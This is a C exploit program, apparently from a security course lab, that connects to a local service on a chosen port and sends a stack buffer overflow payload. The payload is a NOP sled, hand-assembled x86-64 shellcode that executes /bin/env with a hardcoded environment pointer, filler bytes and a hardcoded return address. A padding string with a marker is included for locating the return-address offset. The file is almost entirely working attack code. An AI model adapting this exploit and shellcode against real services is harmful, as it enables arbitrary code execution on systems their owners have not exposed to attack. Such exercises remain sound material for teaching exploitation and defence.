#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[224]={
    // nop sled 119 bytes
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 16 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 24 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 32 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 40 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 48 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 56 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 64 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 72 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 80 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 88 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 96 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 104 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 112 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90,   // 119 NOPs

    // shellcode 59 bytes
    0x48, 0x31, 0xC0,             // xor rax, rax
    0x50,                         // push rax
    0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E, 0x76, // mov rbx, "/bin/env"
    0x53,                         // push rbx
    0x48, 0x89, 0xE7,             // mov rdi, rsp
    0x50,                         // push rax
    0x57,                         // push rdi
    0x48, 0x89, 0xE6,             // mov rsi, rsp
    0x48, 0x31, 0xD2,             // xor rdx, rdx
    0x66, 0xBA, 0xFF, 0x7F, // mov dx, 0x7xff
    0x48, 0xC1, 0xE2, 0x20,       // shl rdx, 32
    0xB9, 0xAA, 0xE6, 0xFB, 0xF7, // mov ecx, 0xf7fbe6aa
    0x30, 0xC9,                   // xor cl, cl
    0x48, 0x09, 0xCA,             // or rdx, rcx
    0x48, 0x8B, 0x12,             // mov rdx, [rdx]
    0xB0, 0x3B,                   // mov al, 0x3b
    0x0F, 0x05,                   // syscall
    0x48, 0x89, 0xC7,             // mov rdi, rax
    0xB0, 0x3C,                   // mov al, 0x3c
    0x0F, 0x05,                   // syscall

    // 40 bytes
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 


    // return address
    0xe0,0xdd,0xff,0xff,
    0xff,0x7f,
    0x0A,0x00
};

char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" //20
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx" // 180
    "xxxxxxxxxxxxxxxxxxxx" // 200
    "xxxxxxxx" // 208
    "MNOPWXYZ"
    "xxxxxxxx\n";

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s", compromise);  
    fflush(outfile);
}

